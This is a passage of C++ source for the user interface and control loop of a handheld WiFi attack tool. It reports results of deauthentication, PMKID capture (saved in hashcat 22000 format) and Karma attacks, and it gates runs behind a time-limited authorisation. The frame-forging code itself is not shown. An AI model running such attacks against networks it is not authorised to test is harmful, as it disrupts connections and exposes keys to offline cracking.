        ui::wrapText(8, y, bd::kScreenW - 16, 10, 3, kMuted,
                     "Transmission has stopped. Listening for clients coming "
                     "back, which is the evidence it worked.");
    } else {
        // The authorisation's remaining life, on screen, because it is what
        // bounds a continuous run.
        d.setTextColor(kFaint, kInk);
        std::snprintf(line, sizeof(line), "authorisation %u min left",
                      static_cast<unsigned>(auth_.remainingMs(millis()) / 60000u));
        d.drawString(line, 8, y);
    }

    ui::footer("x  stop");
    ui::endFrame();
}

void WifiAttack::drawResult() {
    ui::beginFrame();
    auto& d = ui::gfx();

    const atk::Spec* s = atk::spec(plan_.family);
    ui::chrome("Result", s ? s->name : nullptr);

    d.setFont(kFaceData);
    d.setTextDatum(top_left);
    int y = kHeaderH + 6;
    char line[64];

    d.setTextColor(kText, kInk);
    std::snprintf(line, sizeof(line), "%u sent, %u refused",
                  static_cast<unsigned>(framesSent_),
                  static_cast<unsigned>(framesFailed_));
    d.drawString(line, 8, y);
    y += 12;

    // WHAT WAS OBSERVED, and the ceiling on it. Frames the driver accepted are
    // not frames anybody received.
    const char* verdict;
    uint16_t colour;
    if (plan_.family == atk::Family::Pmkid) {
        if (pmkidTarget_.havePmkid) {
            verdict = "This access point volunteered a PMKID. It is crackable "
                      "offline with no client involved.";
            colour  = kCritical;
        } else {
            verdict = "No PMKID offered in this run. That is not proof it never "
                      "will -- only that it did not here.";
            colour  = kMuted;
        }
    } else if (plan_.family == atk::Family::Karma) {
        if (answered_ > 0) {
            verdict = "Devices here are still asking for networks by name, and "
                      "accepted an answer from a stranger.";
            colour  = kHigh;
        } else {
            verdict = "No named probe requests answered. Nothing was asking, or "
                      "nothing was listening.";
            colour  = kMuted;
        }
    } else if (reconnects_ > 0 || eapolSeen_ > 0) {
        verdict = "Clients dropped and came back. The forged frames were "
                  "accepted: this network is not protecting management frames.";
        colour  = kCritical;
    } else {
        verdict = "No reconnections seen. That is NOT proof it had no effect -- "
                  "nobody may have been on the air.";
        colour  = kMuted;
    }
    y = ui::wrapText(8, y, bd::kScreenW - 16, 10, 5, colour, verdict);

    if (plan_.family == atk::Family::Pmkid && pmkidTarget_.havePmkid) {
        d.setTextColor(pmkidSaved_ ? kGood : kBrass, kInk);
        d.drawString(pmkidSaved_ ? pmkidPath_ : "s  save 22000 to card", 8, 112);
    }

    ui::footer("` back");
    ui::endFrame();
}

void WifiAttack::draw() {
    switch (view_) {
        case View::Unavailable: drawUnavailable(); break;
        case View::Networks:    drawNetworks();    break;
        case View::Families:    drawFamilies();    break;
        case View::Arm:         drawArm();         break;
        case View::Running:     drawRunning();     break;
        case View::Result:      drawResult();      break;
    }
    lastDrawMs_ = millis();
}

bool WifiAttack::handleKeys() {
    if (!M5Cardputer.Keyboard.isChange() || !M5Cardputer.Keyboard.isPressed())
        return false;

    const auto ks = M5Cardputer.Keyboard.keysState();

    if (view_ == View::Unavailable) return true;   // any key leaves

    if (ks.enter) {
        if (view_ == View::Networks) {
            if (count_ && lockSelected()) enterFamilies();
            draw();
            return false;
        }
        if (view_ == View::Families) {
            enterArm();
            draw();
            return false;
        }
        return false;
    }

    for (char c : ks.word) {
        switch (view_) {
            case View::Networks:
                if (c == kKeyUp   && selected_ > 0) selected_--;
                if (c == kKeyDown && selected_ + 1 < count_) selected_++;
                if (c == 'r') startScan();
                if (c == kKeyBack) return true;
                break;

            case View::Families:
                if (c == kKeyUp   && family_ > 0) family_--;
                if (c == kKeyDown && family_ + 1 < kWifiFamilyCount) family_++;
                if (c == kKeyBack) { view_ = View::Networks; }
                break;

            case View::Arm:
                if (c == kKeyBack) { view_ = View::Families; holding_ = false; }
                if (c == kKeyWiden) {
                    widenedRegion_ = atk::regionWidenFor(auth_.channel) ||
                                     widenedRegion_;
                    planError_ = atk::validate(plan_, auth_, millis());
                }
                break;

            case View::Running:
                if (c == kKeyStop) { finish(); }
                break;

            case View::Result:
                if (c == kKeySave) savePmkid();
                if (c == kKeyBack) { view_ = View::Families; }
                break;

            default:
                break;
        }
    }
    draw();
    return false;
}

void WifiAttack::run() {
    draw();

    for (;;) {
        M5Cardputer.update();

        if (handleKeys()) break;

        if (scanning_) collectScan();

        if (view_ == View::Arm && planError_ == atk::PlanError::Ok) {
            if (armIfHeld()) startRun();
        }

        if (view_ == View::Running) {
            stepRun();
            stepWatch();
        }

        if (millis() - lastDrawMs_ >= kRedrawMs) draw();
        delay(5);
    }

    stopRx();
    hal::rawTxEnd();
    atk::unlock(auth_);
}

}  // namespace orthrus::modules
